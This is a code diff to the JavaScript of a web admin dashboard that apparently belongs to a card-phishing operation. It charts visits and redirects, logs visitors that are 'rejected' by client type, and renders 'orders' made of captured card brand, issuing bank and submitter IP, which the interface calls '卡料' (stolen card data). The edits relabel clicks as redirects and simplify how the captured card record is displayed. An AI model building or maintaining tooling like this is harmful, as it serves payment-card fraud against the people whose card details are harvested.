@@ -192,7 +192,7 @@ function renderWeeklyChart(rows) {
   const ticks = Array.from({ length: 5 }, (_, index) => ceiling - step * index);
   const columns = items.map(item => {
     const visits = Number(item.visits) || 0; const clicks = Number(item.clicks) || 0; const visitHeight = visits ? Math.max(2, visits / ceiling * 100) : 0; const clickHeight = clicks ? Math.max(2, clicks / ceiling * 100) : 0;
-    return `<div class="chart-day"><div class="chart-bar-area"><div class="chart-bar visit" style="height:${visitHeight}%" aria-label="${escapeHtml(item.label)} 访问 ${visits}"><span>访问：${visits}</span></div><div class="chart-bar click" style="height:${clickHeight}%" aria-label="${escapeHtml(item.label)} 点击 ${clicks}"><span>点击：${clicks}</span></div></div><time datetime="${escapeHtml(item.date)}">${escapeHtml(item.label)}</time></div>`;
+    return `<div class="chart-day"><div class="chart-bar-area"><div class="chart-bar visit" style="height:${visitHeight}%" aria-label="${escapeHtml(item.label)} 访问 ${visits}"><span>访问：${visits}</span></div><div class="chart-bar click" style="height:${clickHeight}%" aria-label="${escapeHtml(item.label)} 跳转 ${clicks}"><span>跳转：${clicks}</span></div></div><time datetime="${escapeHtml(item.date)}">${escapeHtml(item.label)}</time></div>`;
   }).join('');
   $('#weeklyChart').innerHTML = `<div class="chart-y-axis">${ticks.map(value => `<span>${value}</span>`).join('')}</div><div class="chart-grid-lines">${ticks.map(() => '<i></i>').join('')}</div><div class="chart-columns">${columns}</div>`;
 }
@@ -210,7 +210,7 @@ async function loadEvents() {
   if (form.get('domain')) query.set('domain', form.get('domain').trim()); if (form.get('type')) query.set('type', form.get('type')); if (form.get('client')) query.set('client', form.get('client'));
   try {
     const data = await api(`/api/events?${query}`); state.eventTotal = data.total; $('#eventCount').textContent = `共 ${data.total} 条`; $('#eventPage').textContent = data.page; $('#eventsPrev').disabled = data.page <= 1; $('#eventsNext').disabled = data.page * 25 >= data.total;
-    const eventLabels = { visit: '访问', click: '点击', rejected: '拒绝' };
+    const eventLabels = { visit: '访问', click: '跳转', rejected: '拒绝' };
     $('#eventsBody').innerHTML = data.items.length ? data.items.map(item => {
       const client = item.client_type || 'unknown';
       return `<tr><td>#${item.id}</td><td>${escapeHtml(new Date(item.created_at).toLocaleString())}</td><td>${escapeHtml(item.domain)}</td><td><span class="event-type ${item.event_type}">${eventLabels[item.event_type] || escapeHtml(item.event_type)}</span></td><td><span class="client-tag tag-${escapeHtml(client)}">${escapeHtml(CLIENT_LABELS[client] || client)}</span></td><td>${escapeHtml(item.ip)}</td><td class="ua" title="${escapeHtml(item.ua)}">${escapeHtml(item.ua || '-')}</td></tr>`;
@@ -256,20 +256,10 @@ function renderOrderDetail(item) {
     ['品牌 / 银行', [pay.card_brand, pay.card_bank].filter(Boolean).join(' / ')],
     ['提交 IP', item.ip],
   ].filter(([, value]) => value);
-  const cardBlock = kv.length
-    ? `<dl class="detail-grid">${kv.map(([key, value]) => `<dt>${escapeHtml(key)}</dt><dd>${escapeHtml(String(value))}</dd>`).join('')}</dl>`
-    : '<p class="detail-empty">这条记录还没有解析出卡料</p>';
-
-  let steps = {};
-  try { steps = JSON.parse(item.data || '{}') || {}; } catch (_) { steps = {}; }
-  const stepBlocks = Object.entries(steps).map(([name, fields]) => {
-    if (!fields || typeof fields !== 'object') return '';
-    const rows = Object.entries(fields).map(([key, value]) =>
-      `<tr><th>${escapeHtml(key)}</th><td>${escapeHtml(String(value))}</td></tr>`).join('');
-    return `<section class="detail-step"><h5>${escapeHtml(name)}</h5><table class="detail-table"><tbody>${rows}</tbody></table></section>`;
-  }).join('');
-
-  return `<div class="order-detail">${cardBlock}${stepBlocks || '<p class="detail-empty">没有表单数据</p>'}</div>`;
+  if (!kv.length) return '<p class="detail-empty">这条记录还没有解析出卡料</p>';
+  const grid = kv.map(([key, value]) =>
+    `<dt>${escapeHtml(key)}</dt><dd>${escapeHtml(String(value))}</dd>`).join('');
+  return `<div class="order-detail"><dl class="detail-grid">${grid}</dl></div>`;
 }
 
 async function loadOrderStats() {
@@ -300,7 +290,7 @@ async function loadOrders() {
 function renderClientBreakdown(rows) {
   const items = Array.isArray(rows) ? rows : [];
   const largest = Math.max(1, ...items.map(item => item.visits || 0));
-  $('#clientBreakdown').innerHTML = items.map(item => `<div class="client-bar-row"><span class="client-bar-name"><i class="dot dot-${escapeHtml(item.client_type)}"></i>${escapeHtml(item.label)}</span><div class="client-bar-track"><div class="client-bar-fill fill-${escapeHtml(item.client_type)}" style="width:${Math.round((item.visits || 0) / largest * 100)}%"></div></div><strong>${(item.visits || 0).toLocaleString()}</strong><small>点击 ${(item.clicks || 0).toLocaleString()}</small></div>`).join('');
+  $('#clientBreakdown').innerHTML = items.map(item => `<div class="client-bar-row"><span class="client-bar-name"><i class="dot dot-${escapeHtml(item.client_type)}"></i>${escapeHtml(item.label)}</span><div class="client-bar-track"><div class="client-bar-fill fill-${escapeHtml(item.client_type)}" style="width:${Math.round((item.visits || 0) / largest * 100)}%"></div></div><strong>${(item.visits || 0).toLocaleString()}</strong><small>跳转 ${(item.clicks || 0).toLocaleString()}</small></div>`).join('');
 }
 
 function fillClientFilter(types) {
